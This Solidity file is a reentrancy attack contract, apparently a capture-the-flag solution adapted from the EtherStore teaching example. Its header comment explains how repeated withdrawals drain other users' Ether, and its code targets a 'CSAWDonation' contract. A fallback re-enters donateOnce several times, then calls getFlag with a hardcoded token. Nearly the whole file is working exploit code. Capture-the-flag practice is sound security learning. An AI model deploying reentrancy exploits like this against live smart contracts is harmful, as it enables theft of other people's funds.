// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

import 'csaw.sol';

contract Attack {
    uint donated;
    
    CSAWDonation public donationTarget;
    string token = "a86e415031"; 

    constructor(address _csawAddr) {
        donated = 0;
        donationTarget = CSAWDonation(_csawAddr);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        // if (address(etherStore).balance >= 1 ether) {
        if(donated <= 5){
            donated ++;
            donationTarget.donateOnce();
        }else{
            // get flag
            donationTarget.getFlag(bytes32(bytes(token)));
            donated = 0; // reset
        }
        // }
    }

    function attack() external payable {
        require(msg.value >= 0.0001 ether);
        donationTarget.newAccount{value: 0.0001 ether}();
        donationTarget.donateOnce();
    }

    

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function reset() public returns (uint) {
        donated = 0;
        return 0;
    }

    function burnMoney() public returns (uint) {
        donationTarget.donateOnce();
        return 0;
    }

    function setToken(string memory newToken) public {
        token = newToken;
    }

    function getToken() public view returns (string memory) {
        return token;
    }
}